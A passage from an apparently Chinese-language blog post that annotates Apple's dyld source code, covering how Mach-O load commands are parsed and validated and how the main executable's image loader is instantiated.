class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// determine if this mach-o file has classic or compressed LINKEDIT and number of segments it has</span></span><br><span class="line"><span class="keyword">void</span> ImageLoaderMachO::sniffLoadCommands(<span class="keyword">const</span> macho_header* mh, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">bool</span> inCache, <span class="keyword">bool</span>* compressed,</span><br><span class="line">											<span class="keyword">unsigned</span> <span class="keyword">int</span>* segCount, <span class="keyword">unsigned</span> <span class="keyword">int</span>* libCount, <span class="keyword">const</span> LinkContext&amp; context,</span><br><span class="line">											<span class="keyword">const</span> linkedit_data_command** codeSigCmd,</span><br><span class="line">											<span class="keyword">const</span> encryption_info_command** encryptCmd)</span><br><span class="line">&#123;</span><br><span class="line">	*compressed = <span class="literal">false</span>;</span><br><span class="line">	*segCount = <span class="number">0</span>;</span><br><span class="line">	*libCount = <span class="number">0</span>;</span><br><span class="line">	*codeSigCmd = <span class="literal">NULL</span>;</span><br><span class="line">	*encryptCmd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">uint32_t</span> cmd_count = mh-&gt;ncmds;</span><br><span class="line">	<span class="comment">//获取cmds的个数,保存在mach-o文件的头部ncmds字段中</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> startCmds    = (<span class="keyword">struct</span> load_command*)(((<span class="keyword">uint8_t</span>*)mh) + <span class="keyword">sizeof</span>(macho_header));</span><br><span class="line">	<span class="comment">//获取command段开始的地址，startCmds = mach-o地址 + mach-o头部长度</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> endCmds = (<span class="keyword">struct</span> load_command*)(((<span class="keyword">uint8_t</span>*)mh) + <span class="keyword">sizeof</span>(macho_header) + mh-&gt;sizeofcmds);</span><br><span class="line">	<span class="comment">//获取command段结束的地址，endCmds = mach-o地址 + mach-o头部长度 + cmds所用的长度</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd = startCmds;</span><br><span class="line">	<span class="keyword">bool</span> foundLoadCommandSegment = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; cmd_count; ++i) &#123;</span><br><span class="line">		<span class="comment">//遍历每一个command</span></span><br><span class="line">		<span class="keyword">uint32_t</span> cmdLength = cmd-&gt;cmdsize;</span><br><span class="line">		<span class="keyword">struct</span> macho_segment_command* segCmd;</span><br><span class="line">		<span class="keyword">if</span> ( cmdLength &lt; <span class="number">8</span> ) &#123;</span><br><span class="line">			<span class="comment">//格式检测：长度就不对抛出异常</span></span><br><span class="line">			dyld::throwf(<span class="string">"malformed mach-o image: load command #%d length (%u) too small in %s"</span>,</span><br><span class="line">											   i, cmdLength, path);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> nextCmd = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd)+cmdLength);</span><br><span class="line">		<span class="keyword">if</span> ( (nextCmd &gt; endCmds) || (nextCmd &lt; cmd) ) &#123;</span><br><span class="line">			<span class="comment">//格式检测：通过当前command长度寻找nextcmd时，如果nextcmd指不合法的位置就抛出异常</span></span><br><span class="line">			dyld::throwf(<span class="string">"malformed mach-o image: load command #%d length (%u) would exceed sizeofcmds (%u) in %s"</span>,</span><br><span class="line">											   i, cmdLength, mh-&gt;sizeofcmds, path);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span> (cmd-&gt;cmd) &#123;</span><br><span class="line">			<span class="comment">//针对每种类型的command做不同的操作</span></span><br><span class="line">			<span class="keyword">case</span> LC_DYLD_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_DYLD_INFO_ONLY:</span><br><span class="line">				*compressed = <span class="literal">true</span>;</span><br><span class="line">				<span class="comment">//mach-o文件为压缩的mach-o文件</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_COMMAND:</span><br><span class="line">				segCmd = (<span class="keyword">struct</span> macho_segment_command*)cmd;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __MAC_OS_X_VERSION_MIN_REQUIRED</span></span><br><span class="line">				<span class="comment">// rdar://problem/19617624 allow unmapped segments on OSX (but not iOS)</span></span><br><span class="line">				<span class="comment">// 如果segCmd的文件长度大于segCmd的vmszie，抛出异常。</span></span><br><span class="line">				<span class="comment">// <span class="doctag">todo:</span>结合mach-o文件加载内核部分再详细解释</span></span><br><span class="line">				<span class="keyword">if</span> ( (segCmd-&gt;filesize &gt; segCmd-&gt;vmsize) &amp;&amp; (segCmd-&gt;vmsize != <span class="number">0</span>) )</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">				<span class="keyword">if</span> ( segCmd-&gt;filesize &gt; segCmd-&gt;vmsize )</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">				    dyld::throwf(<span class="string">"malformed mach-o image: segment load command %s filesize is larger than vmsize"</span>, segCmd-&gt;segname);</span><br><span class="line">				<span class="comment">// ignore zero-sized segments</span></span><br><span class="line">				<span class="comment">// 忽略长度为0的segments，计算segments的个数</span></span><br><span class="line">				<span class="keyword">if</span> ( segCmd-&gt;vmsize != <span class="number">0</span> )</span><br><span class="line">					*segCount += <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span> ( context.codeSigningEnforced ) &#123;</span><br><span class="line">					<span class="comment">//如果有强制代码签名，则需要更加严格的segments格式合法性检测。</span></span><br><span class="line">					<span class="keyword">uintptr_t</span> vmStart   = segCmd-&gt;vmaddr;</span><br><span class="line">					<span class="keyword">uintptr_t</span> vmSize    = segCmd-&gt;vmsize;</span><br><span class="line">					<span class="keyword">uintptr_t</span> vmEnd     = vmStart + vmSize;</span><br><span class="line">					<span class="keyword">uintptr_t</span> fileStart = segCmd-&gt;fileoff;</span><br><span class="line">					<span class="keyword">uintptr_t</span> fileSize  = segCmd-&gt;filesize;</span><br><span class="line">					</span><br><span class="line">					<span class="comment">//对参数做合法性检测，如果mach-o文件不合法则抛出异常</span></span><br><span class="line">					<span class="keyword">if</span> ( (<span class="keyword">intptr_t</span>)(vmEnd) &lt; <span class="number">0</span>)</span><br><span class="line">						dyld::throwf(<span class="string">"malformed mach-o image: segment load command %s vmsize too large"</span>, segCmd-&gt;segname);</span><br><span class="line">					<span class="keyword">if</span> ( vmStart &gt; vmEnd )</span><br><span class="line">						dyld::throwf(<span class="string">"malformed mach-o image: segment load command %s wraps around address space"</span>, segCmd-&gt;segname);</span><br><span class="line">					<span class="keyword">if</span> ( vmSize != fileSize ) &#123;</span><br><span class="line">						<span class="keyword">if</span> ( (segCmd-&gt;initprot == <span class="number">0</span>) &amp;&amp; (fileSize != <span class="number">0</span>) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: unaccessable segment %s has filesize != 0"</span>, segCmd-&gt;segname);</span><br><span class="line">						<span class="keyword">else</span> <span class="keyword">if</span> ( vmSize &lt; fileSize )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s has vmsize &lt; filesize"</span>, segCmd-&gt;segname);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> ( inCache ) &#123;</span><br><span class="line">						<span class="keyword">if</span> ( (fileSize != <span class="number">0</span>) &amp;&amp; (segCmd-&gt;initprot == (VM_PROT_READ | VM_PROT_EXECUTE)) ) &#123;</span><br><span class="line">							<span class="keyword">if</span> ( foundLoadCommandSegment )</span><br><span class="line">								<span class="keyword">throw</span> <span class="string">"load commands in multiple segments"</span>;</span><br><span class="line">							foundLoadCommandSegment = <span class="literal">true</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> ( (fileStart &lt; mh-&gt;sizeofcmds) &amp;&amp; (fileSize != <span class="number">0</span>) ) &#123;</span><br><span class="line">						<span class="comment">// &lt;rdar://problem/7942521&gt; all load commands must be in an executable segment</span></span><br><span class="line">						<span class="keyword">if</span> ( (fileStart != <span class="number">0</span>) || (fileSize &lt; (mh-&gt;sizeofcmds+<span class="keyword">sizeof</span>(macho_header))) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s does not span all load commands"</span>, segCmd-&gt;segname); </span><br><span class="line">						<span class="keyword">if</span> ( segCmd-&gt;initprot != (VM_PROT_READ | VM_PROT_EXECUTE) ) </span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: load commands found in segment %s with wrong permissions"</span>, segCmd-&gt;segname); </span><br><span class="line">						<span class="keyword">if</span> ( foundLoadCommandSegment )</span><br><span class="line">							<span class="keyword">throw</span> <span class="string">"load commands in multiple segments"</span>;</span><br><span class="line">						foundLoadCommandSegment = <span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">const</span> <span class="keyword">struct</span> macho_section* <span class="keyword">const</span> sectionsStart = (<span class="keyword">struct</span> macho_section*)((<span class="keyword">char</span>*)segCmd + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> macho_segment_command));</span><br><span class="line">					<span class="keyword">const</span> <span class="keyword">struct</span> macho_section* <span class="keyword">const</span> sectionsEnd = &amp;sectionsStart[segCmd-&gt;nsects];</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">struct</span> macho_section* sect=sectionsStart; sect &lt; sectionsEnd; ++sect) &#123;</span><br><span class="line">						<span class="keyword">if</span> (!inCache &amp;&amp; sect-&gt;offset != <span class="number">0</span> &amp;&amp; ((sect-&gt;offset + sect-&gt;size) &gt; (segCmd-&gt;fileoff + segCmd-&gt;filesize)))</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: section %s,%s of '%s' exceeds segment %s booundary"</span>, sect-&gt;segname, sect-&gt;sectname, path, segCmd-&gt;segname);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_COMMAND_WRONG:</span><br><span class="line">				dyld::throwf(<span class="string">"malformed mach-o image: wrong LC_SEGMENT[_64] for architecture"</span>); </span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_WEAK_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> LC_REEXPORT_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_UPWARD_DYLIB:</span><br><span class="line">				*libCount += <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_CODE_SIGNATURE:</span><br><span class="line">				*codeSigCmd = (<span class="keyword">struct</span> linkedit_data_command*)cmd; <span class="comment">// only support one LC_CODE_SIGNATURE per image</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO_64:</span><br><span class="line">				*encryptCmd = (<span class="keyword">struct</span> encryption_info_command*)cmd; <span class="comment">// only support one LC_ENCRYPTION_INFO[_64] per image</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cmd = nextCmd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( context.codeSigningEnforced &amp;&amp; !foundLoadCommandSegment )</span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"load commands not in a segment"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// &lt;rdar://problem/13145644&gt; verify every segment does not overlap another segment</span></span><br><span class="line">	<span class="keyword">if</span> ( context.codeSigningEnforced ) &#123;</span><br><span class="line">		<span class="comment">//如果设置了强制代码签名，则需要更加严格的检测，确认segments没有互相覆盖。</span></span><br><span class="line">		<span class="keyword">uintptr_t</span> lastFileStart = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">uintptr_t</span> linkeditFileStart = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd1 = startCmds;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; cmd_count; ++i) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( cmd1-&gt;cmd == LC_SEGMENT_COMMAND ) &#123;</span><br><span class="line">				<span class="keyword">struct</span> macho_segment_command* segCmd1 = (<span class="keyword">struct</span> macho_segment_command*)cmd1;</span><br><span class="line">				<span class="keyword">uintptr_t</span> vmStart1   = segCmd1-&gt;vmaddr;</span><br><span class="line">				<span class="keyword">uintptr_t</span> vmEnd1     = segCmd1-&gt;vmaddr + segCmd1-&gt;vmsize;</span><br><span class="line">				<span class="keyword">uintptr_t</span> fileStart1 = segCmd1-&gt;fileoff;</span><br><span class="line">				<span class="keyword">uintptr_t</span> fileEnd1   = segCmd1-&gt;fileoff + segCmd1-&gt;filesize;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (fileStart1 &gt; lastFileStart)</span><br><span class="line">					lastFileStart = fileStart1;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;segCmd1-&gt;segname[<span class="number">0</span>], <span class="string">"__LINKEDIT"</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">					linkeditFileStart = fileStart1;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd2 = startCmds;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">uint32_t</span> j = <span class="number">0</span>; j &lt; cmd_count; ++j) &#123;</span><br><span class="line">					<span class="keyword">if</span> ( cmd2 == cmd1 )</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span> ( cmd2-&gt;cmd == LC_SEGMENT_COMMAND ) &#123;</span><br><span class="line">						<span class="keyword">struct</span> macho_segment_command* segCmd2 = (<span class="keyword">struct</span> macho_segment_command*)cmd2;</span><br><span class="line">						<span class="keyword">uintptr_t</span> vmStart2   = segCmd2-&gt;vmaddr;</span><br><span class="line">						<span class="keyword">uintptr_t</span> vmEnd2     = segCmd2-&gt;vmaddr + segCmd2-&gt;vmsize;</span><br><span class="line">						<span class="keyword">uintptr_t</span> fileStart2 = segCmd2-&gt;fileoff;</span><br><span class="line">						<span class="keyword">uintptr_t</span> fileEnd2   = segCmd2-&gt;fileoff + segCmd2-&gt;filesize;</span><br><span class="line">						<span class="keyword">if</span> ( ((vmStart2 &lt;= vmStart1) &amp;&amp; (vmEnd2 &gt; vmStart1) &amp;&amp; (vmEnd1 &gt; vmStart1)) </span><br><span class="line">						|| ((vmStart2 &gt;= vmStart1) &amp;&amp; (vmStart2 &lt; vmEnd1) &amp;&amp; (vmEnd2 &gt; vmStart2)) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s vm overlaps segment %s"</span>, segCmd1-&gt;segname, segCmd2-&gt;segname);</span><br><span class="line">						<span class="keyword">if</span> ( ((fileStart2 &lt;= fileStart1) &amp;&amp; (fileEnd2 &gt; fileStart1) &amp;&amp; (fileEnd1 &gt; fileStart1))</span><br><span class="line">						  || ((fileStart2 &gt;= fileStart1) &amp;&amp; (fileStart2 &lt; fileEnd1) &amp;&amp; (fileEnd2 &gt; fileStart2)) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s file content overlaps segment %s"</span>, segCmd1-&gt;segname, segCmd2-&gt;segname); </span><br><span class="line">					&#125;</span><br><span class="line">					cmd2 = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd2)+cmd2-&gt;cmdsize);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			cmd1 = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd1)+cmd1-&gt;cmdsize);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (lastFileStart != linkeditFileStart)</span><br><span class="line">			dyld::throwf(<span class="string">"malformed mach-o image: __LINKEDIT must be last segment"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fSegmentsArrayCount is only 8-bits</span></span><br><span class="line">	<span class="keyword">if</span> ( *segCount &gt; <span class="number">255</span> )</span><br><span class="line">		dyld::throwf(<span class="string">"malformed mach-o image: more than 255 segments in %s"</span>, path);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fSegmentsArrayCount is only 8-bits</span></span><br><span class="line">	<span class="keyword">if</span> ( *libCount &gt; <span class="number">4095</span> )</span><br><span class="line">		dyld::throwf(<span class="string">"malformed mach-o image: more than 4095 dependent libraries in %s"</span>, path);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( needsAddedLibSystemDepency(*libCount, mh) )</span><br><span class="line">		*libCount = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-5_instantiateMainExecutable">1.2.5 instantiateMainExecutable</h3><p>classic与compressed的初始化大同小异，先看一下Classic的初始化函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create image for main executable</span></span><br><span class="line">ImageLoaderMachOClassic* ImageLoaderMachOClassic::instantiateMainExecutable(<span class="keyword">const</span> macho_header* mh, <span class="keyword">uintptr_t</span> slide, <span class="keyword">const</span> <span class="keyword">char</span>* path, </span><br><span class="line">																		<span class="keyword">unsigned</span> <span class="keyword">int</span> segCount, <span class="keyword">unsigned</span> <span class="keyword">int</span> libCount, <span class="keyword">const</span> LinkContext&amp; context)</span><br><span class="line">&#123;</span><br><span class="line">	ImageLoaderMachOClassic* image = ImageLoaderMachOClassic::instantiateStart(mh, path, segCount, libCount);</span><br><span class="line">	<span class="comment">//实例化image</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//为PIE设置所需的参数，Position Independent Executables</span></span><br><span class="line">	<span class="comment">//<span class="doctag">todo:</span>分析了解PIE</span></span><br><span class="line">	<span class="comment">// set slide for PIE programs</span></span><br><span class="line">	image-&gt;setSlide(slide);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// for PIE record end of program, to know where to start loading dylibs</span></span><br><span class="line">	<span class="keyword">if</span> ( slide != <span class="number">0</span> )</span><br><span class="line">		fgNextPIEDylibAddress = (<span class="keyword">uintptr_t</span>)image-&gt;getEnd();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置一堆参数</span></span><br><span class="line">	image-&gt;disableCoverageCheck();</span><br><span class="line">	image-&gt;instantiateFinish(context);</span><br><span class="line">	image-&gt;setMapped(context);</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__</span></span><br><span class="line">	<span class="comment">// kernel may have mapped in __IMPORT segment read-only, we need it read/write to do binding</span></span><br><span class="line">	<span class="keyword">if</span> ( image-&gt;fReadOnlyImportSegment ) &#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>; i &lt; image-&gt;fSegmentsCount; ++i) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( image-&gt;segIsReadOnlyImport(i) )</span><br><span class="line">				image-&gt;segMakeWritable(i, context);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//如果设置了context.verboseMapping，打印详细的LOG</span></span><br><span class="line">	<span class="keyword">if</span> ( context.verboseMapping ) &#123;</span><br><span class="line">		dyld::<span class="built_in">log</span>(<span class="string">"dyld: Main executable mapped %s\n"</span>, path);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>, e=image-&gt;segmentCount(); i &lt; e; ++i) &#123;</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span>* name = image-&gt;segName(i);</span><br><span class="line">			<span class="keyword">if</span> ( (<span class="built_in">strcmp</span>(name, <span class="string">"__PAGEZERO"</span>) == <span class="number">0</span>) || (<span class="built_in">strcmp</span>(name, <span class="string">"__UNIXSTACK"</span>) == <span class="number">0</span>)  )</span><br><span class="line">				dyld::<span class="built_in">log</span>(<span class="string">"%18s at 0x%08lX-&gt;0x%08lX\n"</span>, name, image-&gt;segPreferredLoadAddress(i), image-&gt;segPreferredLoadAddress(i)+image-&gt;segSize(i));</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				dyld::<span class="built_in">log</span>(<span class="string">"%18s at 0x%08lX-&gt;0x%08lX\n"</span>, name, image-&gt;segActualLoadAddress(i), image-&gt;segActualEndAddress(i));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> image;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到加载的核心代码还在<code>ImageLoaderMachOClassic::instantiateStart</code>函数中。</p>
<h3 id="1-2-6_instantiateStart">1.2.6 instantiateStart</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// construct ImageLoaderMachOClassic using "placement new" with SegmentMachO objects array at end</span><br><span class="line">ImageLoaderMachOClassic* ImageLoaderMachOClassic::instantiateStart(const macho_header* mh, const char* path,</span><br><span class="line">																		unsigned int segCount, unsigned int libCount)</span><br><span class="line">&#123;</span><br><span class="line">	size_t size = sizeof(ImageLoaderMachOClassic) + segCount * sizeof(uint32_t) + libCount * sizeof(ImageLoader*);</span><br><span class="line">	ImageLoaderMachOClassic* allocatedSpace = static_cast&lt;ImageLoaderMachOClassic*&gt;(malloc(size));</span><br><span class="line">	if ( allocatedSpace == NULL )</span><br><span class="line">		throw "malloc failed";</span><br><span class="line">	uint32_t* segOffsets = ((uint32_t*)(((uint8_t*)allocatedSpace) + sizeof(ImageLoaderMachOClassic)));</span><br><span class="line">	bzero(&amp;segOffsets[segCount], libCount*sizeof(void*));	// zero out lib array</span><br><span class="line">	return new (allocatedSpace) ImageLoaderMachOClassic(mh, path, segCount, segOffsets, libCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里仍然没有出现加载核心代码，只是根据之前获得的数据申请了内存，并计算了segments的指针。而</p>
<p><code>ImageLoaderMachOClassic</code>的构造才是加载逻辑。</p>
<h3 id="1-2-7_ImageLoaderMachO">1.2.7 ImageLoaderMachO</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">ImageLoaderMachOClassic::ImageLoaderMachOClassic(<span class="keyword">const</span> macho_header* mh, <span class="keyword">const</span> <span class="keyword">char</span>* path, </span><br><span class="line">													<span class="keyword">unsigned</span> <span class="keyword">int</span> segCount, <span class="keyword">uint32_t</span> segOffsets[], <span class="keyword">unsigned</span> <span class="keyword">int</span> libCount)</span><br><span class="line"> : ImageLoaderMachO(mh, path, segCount, segOffsets, libCount), fStrings(<span class="literal">NULL</span>), fSymbolTable(<span class="literal">NULL</span>), fDynamicInfo(<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ImageLoaderMachO::ImageLoaderMachO(<span class="keyword">const</span> macho_header* mh, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">unsigned</span> <span class="keyword">int</span> segCount, </span><br><span class="line">																<span class="keyword">uint32_t</span> segOffsets[], <span class="keyword">unsigned</span> <span class="keyword">int</span> libCount)</span><br><span class="line"> : ImageLoader(path, libCount), fCoveredCodeLength(<span class="number">0</span>), fMachOData((<span class="keyword">uint8_t</span>*)mh), fLinkEditBase(<span class="literal">NULL</span>), fSlide(<span class="number">0</span>),</span><br><span class="line">	fEHFrameSectionOffset(<span class="number">0</span>), fUnwindInfoSectionOffset(<span class="number">0</span>), fDylibIDOffset(<span class="number">0</span>), </span><br><span class="line">fSegmentsCount(segCount), fIsSplitSeg(<span class="literal">false</span>), fInSharedCache(<span class="literal">false</span>),</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> TEXT_RELOC_SUPPORT</span></span><br><span class="line">	fTextSegmentRebases(<span class="literal">false</span>),</span><br><span class="line">	fTextSegmentBinds(<span class="literal">false</span>),</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__</span></span><br><span class="line">	fReadOnlyImportSegment(<span class="literal">false</span>),</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	fHasSubLibraries(<span class="literal">false</span>), fHasSubUmbrella(<span class="literal">false</span>), fInUmbrella(<span class="literal">false</span>), fHasDOFSections(<span class="literal">false</span>), fHasDashInit(<span class="literal">false</span>),</span><br><span class="line">	fHasInitializers(<span class="literal">false</span>), fHasTerminators(<span class="literal">false</span>), fRegisteredAsRequiresCoalescing(<span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">	fIsSplitSeg = ((mh-&gt;flags &amp; MH_SPLIT_SEGS) != <span class="number">0</span>);        </span><br><span class="line"></span><br><span class="line">	<span class="comment">// construct SegmentMachO object for each LC_SEGMENT cmd using "placement new" to put </span></span><br><span class="line">	<span class="comment">// each SegmentMachO object in array at end of ImageLoaderMachO object</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">uint32_t</span> cmd_count = mh-&gt;ncmds;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> cmds = (<span class="keyword">struct</span> load_command*)&amp;fMachOData[<span class="keyword">sizeof</span>(macho_header)];</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd = cmds;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>, segIndex=<span class="number">0</span>; i &lt; cmd_count; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( cmd-&gt;cmd == LC_SEGMENT_COMMAND ) &#123;</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">struct</span> macho_segment_command* segCmd = (<span class="keyword">struct</span> macho_segment_command*)cmd;</span><br><span class="line">			<span class="comment">// ignore zero-sized 